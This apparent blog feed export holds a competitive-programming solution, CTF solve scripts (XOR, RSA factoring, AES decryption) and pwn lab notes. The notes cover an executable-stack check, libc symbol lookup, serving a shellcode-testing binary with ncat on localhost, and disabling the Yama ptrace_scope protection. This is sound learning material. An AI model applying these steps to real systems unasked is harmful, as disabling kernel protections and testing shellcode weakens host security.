src="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518200737208.evk8cdnb9iw.webp" alt="image-20220518200737208"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> debug(x) cout &lt;&lt; <span class="string">"[*]"</span> &lt;&lt; #x &lt;&lt; <span class="string">" = "</span> &lt;&lt; x &lt;&lt; <span class="string">"\n"</span>;</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">2e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n, a[maxn], b[maxn];</span><br><span class="line"><span class="type">int</span> ans_x, ans_y;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">while</span> (n--) {</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y;</span><br><span class="line"><span class="keyword">if</span> (a[x]) ans_x -= <span class="number">2</span>;</span><br><span class="line">a[x]++;</span><br><span class="line"><span class="keyword">if</span> (a[x] &lt;= a[x - <span class="number">1</span>]) ans_x -= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (a[x] &lt;= a[x + <span class="number">1</span>]) ans_x -= <span class="number">2</span>;</span><br><span class="line">ans_x += <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span> (b[y]) ans_y -= <span class="number">2</span>;</span><br><span class="line">b[y]++;</span><br><span class="line"><span class="keyword">if</span> (b[y] &lt;= b[y - <span class="number">1</span>]) ans_y -= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (b[y] &lt;= b[y + <span class="number">1</span>]) ans_y -= <span class="number">2</span>;</span><br><span class="line">ans_y += <span class="number">4</span>;</span><br><span class="line"><span class="comment">//debug(b[x]);</span></span><br><span class="line"><span class="comment">//debug(b[x + 1]);</span></span><br><span class="line"><span class="comment">//debug(b[x - 1]);</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans_x &lt;&lt; <span class="string">" "</span> &lt;&lt; ans_y &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="F-Birthday-Cake"><a href="#F-Birthday-Cake" class="headerlink" title="F. Birthday Cake"></a>F. Birthday Cake</h2><p>请帮助Yamabuki分蛋糕，Yamabuki有n种不同的蛋糕，可以用小写拉丁字母表示，表示蛋糕上面有什么，字符串的拼接表示蛋糕的合并。</p><p>若AB满足CC结构，（A，B两个字符串拼接后可以拆成两个相同的字符串即满足此规律），若AB满足，则BA也满足，所以枚举A的时候找可以满足条件的B即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod[<span class="number">2</span>] = {<span class="number">999999929</span>,<span class="number">1000000007</span>};</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">4e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> sz = <span class="number">233</span>;</span><br><span class="line"><span class="keyword">using</span> ll = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line">string a[maxn];</span><br><span class="line">ll Hase[maxn][<span class="number">2</span>];</span><br><span class="line">ll fac[maxn][<span class="number">2</span>];</span><br><span class="line">map&lt;pair&lt;ll,ll&gt;,<span class="type">int</span>&gt; mp;</span><br><span class="line"><span class="function">ll <span class="title">length</span><span class="params">(ll now, <span class="type">int</span> small, <span class="type">int</span> mod)</span> </span>{</span><br><span class="line"><span class="keyword">return</span> (now * sz + small) % mod;</span><br><span class="line">}</span><br><span class="line"><span class="function">ll <span class="title">fetch</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>{</span><br><span class="line"><span class="keyword">return</span> (Hase[r][idx]-Hase[l<span class="number">-1</span>][idx]*fac[r-l+<span class="number">1</span>][idx]%mod[idx]+mod[idx])%mod[idx];</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    fac[<span class="number">0</span>][<span class="number">0</span>] = fac[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">400000</span>;++i){</span><br><span class="line">        fac[i][<span class="number">0</span>] = fac[i<span class="number">-1</span>][<span class="number">0</span>]*sz%mod[<span class="number">0</span>];</span><br><span class="line">        fac[i][<span class="number">1</span>] = fac[i<span class="number">-1</span>][<span class="number">1</span>]*sz%mod[<span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;++i){</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,[](<span class="type">const</span> string&amp;a,<span class="type">const</span> string &amp;b)-&gt;<span class="type">bool</span>{</span><br><span class="line">        <span class="keyword">return</span> a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>();</span><br><span class="line">    });</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;++i){</span><br><span class="line">        ll val[<span class="number">2</span>] = {<span class="number">0</span>,<span class="number">0</span>};</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; a[i].<span class="built_in">size</span>();++j){</span><br><span class="line">        val[<span class="number">0</span>] = <span class="built_in">length</span>(val[<span class="number">0</span>], a[i][j], mod[<span class="number">0</span>]);</span><br><span class="line">            Hase[j+<span class="number">1</span>][<span class="number">0</span>] = val[<span class="number">0</span>];</span><br><span class="line">            val[<span class="number">1</span>] = <span class="built_in">length</span>(val[<span class="number">1</span>], a[i][j], mod[<span class="number">1</span>]);</span><br><span class="line">            Hase[j+<span class="number">1</span>][<span class="number">1</span>] = val[<span class="number">1</span>];</span><br><span class="line">        }</span><br><span class="line">        ans += mp[<span class="built_in">make_pair</span>(val[<span class="number">0</span>],val[<span class="number">1</span>])];</span><br><span class="line">        <span class="type">int</span> len = a[i].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt;= len/<span class="number">2</span>;++j){</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">fetch</span>(<span class="number">1</span>, j, <span class="number">0</span>) == <span class="built_in">fetch</span>(len - j + <span class="number">1</span>, len, <span class="number">0</span>) &amp;&amp; </span><br><span class="line">               <span class="built_in">fetch</span>(<span class="number">1</span>, j, <span class="number">1</span>) == <span class="built_in">fetch</span>(len - j + <span class="number">1</span>, len, <span class="number">1</span>)) {</span><br><span class="line">                ans += mp[<span class="built_in">make_pair</span>(<span class="built_in">fetch</span>(j + <span class="number">1</span>, len - j, <span class="number">0</span>), <span class="built_in">fetch</span>(j + <span class="number">1</span>, len - j, <span class="number">1</span>))];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        mp[<span class="built_in">make_pair</span>(val[<span class="number">0</span>],val[<span class="number">1</span>])]++;</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;马上省赛，为了应付一下这个考试，得看看往年题，总结一下经验。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Dest0g3-begin</title>
    <link href="http://im0use.github.io/2022/05/18/Dest0g3-begin/"/>
    <id>http://im0use.github.io/2022/05/18/Dest0g3-begin/</id>
    <published>2022-05-18T14:43:16.000Z</published>
    <updated>2022-05-29T01:04:06.111Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="simple-xor"><a href="#simple-xor" class="headerlink" title="simple xor"></a>simple xor</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main() {</span><br><span class="line">    <span class="type">char</span> val[] = {</span><br><span class="line">        <span class="number">0xB3</span>, <span class="number">0x91</span>, <span class="number">0x82</span>, <span class="number">0x80</span>,</span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0x75</span>,</span><br><span class="line">        <span class="number">0xCF</span>, <span class="number">0x9C</span>, <span class="number">0x9A</span>, <span class="number">0x85</span>,</span><br><span class="line">        <span class="number">0x85</span>, <span class="number">0xCD</span>, <span class="number">0xB8</span>, <span class="number">0x84</span>,</span><br><span class="line">        <span class="number">0xAA</span>, <span class="number">0x7D</span>, <span class="number">0xBD</span>, <span class="number">0xBB</span>,</span><br><span class="line">        <span class="number">0xB1</span>, <span class="number">0xB5</span>, <span class="number">0x96</span>, <span class="number">0x71</span>,</span><br><span class="line">        <span class="number">0x8D</span>, <span class="number">0x9E</span>, <span class="number">0x86</span>, <span class="number">0xBF</span>,</span><br><span class="line">        <span class="number">0x73</span>, <span class="number">0xA8</span>, <span class="number">0xA3</span>, <span class="number">0x9C</span>,</span><br><span class="line">        <span class="number">0x83</span>, <span class="number">0x65</span>, <span class="number">0x9E</span>, <span class="number">0x57</span>,</span><br><span class="line">    };</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x88</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> key = <span class="number">247</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; i++) {</span><br><span class="line">        flag[i] = (val[i] ^ key) - i;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, flag);</span><br><span class="line">}   </span><br></pre></td></tr></table></figure><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line">c = <span class="number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line"></span><br><span class="line">sqrt_n = iroot(n - <span class="number">1</span>, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(sqrt_n)</span><br><span class="line">q = next_prime(sqrt_n)</span><br><span class="line">p = n // q</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = <span class="string">b'\xa4\xa6M\xab{\xf6\x97\x94&gt;hK\x9bBe]F'</span></span><br><span class="line">iv = <span class="string">b'\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80'</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">c = <span class="string">b'C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07'</span></span><br><span class="line">flag = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="你知道js吗"><a href="#你知道js吗" class="headerlink" title="你知道js吗"></a>你知道js吗</h2><p>file 发现是 word 文档，然后换成其他字体，复制到 base64 解码，然后 brainfuck，然后在解码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;simple-xor&quot;&gt;&lt;a href=&quot;#simple-xor&quot; class=&quot;headerlink&quot; title=&quot;simple xor&quot;&gt;&lt;/a&gt;simple xor&lt;/h2&gt;&lt;figure class=&quot;h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>decompile_trick</title>
    <link href="http://im0use.github.io/2022/05/18/decompile/"/>
    <id>http://im0use.github.io/2022/05/18/decompile/</id>
    <published>2022-05-18T14:43:16.000Z</published>
    <updated>2022-05-29T01:04:37.565Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Tools-or-stricks"><a href="#Tools-or-stricks" class="headerlink" title="Tools or stricks"></a>Tools or stricks</h1><h2 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h2><blockquote><p>千万不要学AT&amp;T格式</p></blockquote><p><code>-M intel</code>: intel 格式</p><p>比较intel和AT&amp;T格式的反汇编区别<code>vimdiff &lt;(objdump -d orw) &lt;(objdump -M intel -d orw)</code></p><p>建立快捷intel格式，<code>alias objdump='objdump -M intel</code></p><h2 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h2><ul><li>分析 ELF binary 功能</li><li><code>readelf -a | grep STACK</code> 看能不能跑 shellcode</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sb@xulun:~/pwn/HITCON-Training/LAB/lab2$ readelf -a orw | grep STACK</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10</span><br></pre></td></tr></table></figure><p>E表示可以执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/`pidof orw`/maps <span class="comment"># `pidof orw` 表示 orw 文件的pid进程号</span></span><br><span class="line">ffe9d000-ffebe000 rwxp 00000000 00:00 0                                  [stack]</span><br></pre></td></tr></table></figure><p>stack上有x表示可以执行。</p><h2 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h2><ul><li>寻找 libc 的一些 symbol 比如 system。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sb@xulun:~/pwn/HITCON-Training/LAB/lab2$ readelf -a /lib/i386-linux-gnu/libc.so<span class="number">.6</span> | grep system</span><br><span class="line">   <span class="number">259</span>: <span class="number">00135e80</span>   <span class="number">106</span> FUNC    GLOBAL DEFAULT   <span class="number">15</span> svcerr_systemerr@@GLIBC_2<span class="number">.0</span></span><br><span class="line">   <span class="number">664</span>: <span class="number">00041780</span>    <span class="number">63</span> FUNC    GLOBAL DEFAULT   <span class="number">15</span> __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  <span class="number">1537</span>: <span class="number">00041780</span>    <span class="number">63</span> FUNC    WEAK   DEFAULT   <span class="number">15</span> system@@GLIBC_2<span class="number">.0</span></span><br></pre></td></tr></table></figure><ul><li>小技巧<ul><li>寻找某个 symbol 时，写成 ‘ symbol@’，假设 symbol 是某一个函数。</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep <span class="string">' system@'</span></span><br><span class="line">  1537: 00041780    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep <span class="string">' printf@'</span></span><br><span class="line">   685: 000502b0    45 FUNC    GLOBAL DEFAULT   15 <span class="built_in">printf</span>@@GLIBC_2.0</span><br></pre></td></tr></table></figure><h2 id="XXD"><a href="#XXD" class="headerlink" title="XXD"></a>XXD</h2><ul><li>类似于 IDA pro 的 string</li><li>Linux 自带的 strings 也不错</li></ul><h2 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc ./shellcode -kl 127.0.0.1 8888</span><br><span class="line">-vc: check</span><br><span class="line">-kl: keep listen</span><br><span class="line">ip(default): 127.0.0.1</span><br><span class="line">ncat -vc <span class="string">'strace -e trace=read ./elf'</span> -kl ::1 4000</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># one 转发端口监听</span></span><br><span class="line">$ ncat -vc ./orw -kl 127.0.0.1 8888</span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on 127.0.0.1:8888</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:55184.</span><br><span class="line"><span class="comment"># two 连接端口传输</span></span><br><span class="line">$ nc 127.0.0.1 8888</span><br><span class="line">Give my your shellcode:</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ pidof orw # 查看进程pid </span><br><span class="line"><span class="number">986668</span></span><br><span class="line">$ gdb attach <span class="number">986668</span></span><br><span class="line">Attaching to process <span class="number">986668</span></span><br><span class="line">(gdb)</span><br><span class="line">Could not attach to process.  If your uid matches the uid of the target</span><br><span class="line">process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try</span><br><span class="line">again as the root user.  For more details, see /etc/sysctl.d/<span class="number">10</span>-ptrace.conf</span><br><span class="line">ptrace: Operation not permitted.</span><br><span class="line">$ echo <span class="number">0</span> | /proc/sys/kernel/yama/ptrace_scope # 就可以attach了</span><br><span class="line">$ echo <span class="string">"0"</span>|sudo tee /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">finish该条程序结束回到eip即下一条指令执行地点</span><br></pre></td></tr></table></figure><h2 id="Hook-amp-Patch"><a href="#Hook-amp-Patch" class="headerlink" title="Hook & Patch"></a>Hook &amp; Patch</h2><ul><li>更改 symbol</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h1 id=&quot;Tools-or-stricks&quot;&gt;&lt;a href=&quot;#Tools-or-stricks&quot; class=&quot;headerlink&quot; title=&quot;Tools or stricks&quot;&gt;&lt;/a&gt;Tools or stri</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>fixed_xor</title>
    <link href="http://im0use.github.io/2022/05/18/fixed_cor/"/>
    <id>http://im0use.github.io/2022/05/18/fixed_cor/</id>
    <published>2022-05-18T14:43:16.000Z</published>
    <updated>2022-05-29T01:03:39.916Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>request a function to xor on two strings with the same length.</p><p>we need know some tools</p><ul><li><code>^</code>: xor operator</li><li></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;request a function to xor on two strings with the same length.&lt;/p&gt;
&lt;p&gt;we need know some tools&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HITCON-train-hacknote</title>
    <link href="http://im0use.github.io/2022/05/18/HITCON-train-hacknote/"/>
    <id>http://im0use.github.io/2022/05/18/HITCON-train-hacknote/</id>
    <published>2022-05-18T14:43:16.000Z</published>
    <updated>2022-05-22T15:34:50.903Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>一个写笔记的程序，下面是程序的一些功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ ./hacknote </span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :12</span><br><span class="line">Content :wtffff</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :3</span><br><span class="line">Index :0</span><br><span class="line">wtffff</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :4</span><br></pre></td></tr></table></figure><p>因为想去弄懂一些细节，所以在GitHub上搜到了源代码。</p><p>顺便看看并总结angelboy大神的幻灯片，分享收获。</p><h2 id="The-workflow-of-malloc"><a href="#The-workflow-of-malloc" class="headerlink" title="The workflow of malloc"></a>The workflow of malloc</h2><ul><li>第一次执行 malloc</li></ul><p><img src="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518230240720.3pwbksljbeo0.webp" alt="image-20220518230240720"></p><ul><li>无论一开始 malloc 多少空间 &lt; 128 KB 都会有 kernel 给132 KB 的 heap segment (rw) 这部分为 main arena</li></ul><p><img src="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518225637309.1vf5jk0s4wbk.webp" alt="image-20220518225637309"></p><ul><li>第二次执行 malloc 时，只要分配的空间大小不超过 128 KB，则不再执行 system call 跟系统要空间，超过大小才会有 brk 从kernel 索要空间存储。<ul><li>即使 free 掉所有 main arena 分配的空间，也不会立即还给 kernel</li></ul></li><li>这时存储空间由 glibc 管理</li></ul><h2 id="Mechanism-of-glibc-malloc"><a href="#Mechanism-of-glibc-malloc" class="headerlink" title="Mechanism of glibc malloc"></a>Mechanism of glibc malloc</h2><ul><li>Chunk<ul><li>glibc 在用作存储管理时的数据结构</li><li>malloc 时分配出去的为一个 chunk</li><li>chunk header（prev_size + size）+ user data</li><li>如果该 chunk 被 free 则会将 chunk 加入叫做 bin 的链表里</li></ul></li><li>分类<ul><li>​Allocated chunk</li><li>​    Free chunk</li><li>​    Top chunk</li></ul></li><li>heap</li></ul><p><img src="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518231006560.33g13n7oknc0.webp" alt="image-20220518231006560"></p><ul><li>Allocated chunk<ul><li>prev_size<ul><li>如果上一个的 chunk 是 freed，则该位置上会存有上一个 chunk 的 size（包括 header）</li><li>这里指的上一个是在连续存储的上一个</li></ul></li><li>size<ul><li>该 chunk 大小，其中有三个 flag<ul><li>PREV_INUSE (bit 0): 上一个 chunk 是否不是 freed</li><li>IS_MMAPPED (bit 1): 该 chunk 是不是由 mmap 所分配出去的</li><li>NON_MAIN_ARENA (bit 2): 是否不属于 main arena</li></ul></li></ul></li><li>图</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518231653721.tp8j0nbjh9c.webp" alt="image-20220518231653721"></p><ul><li><p>free 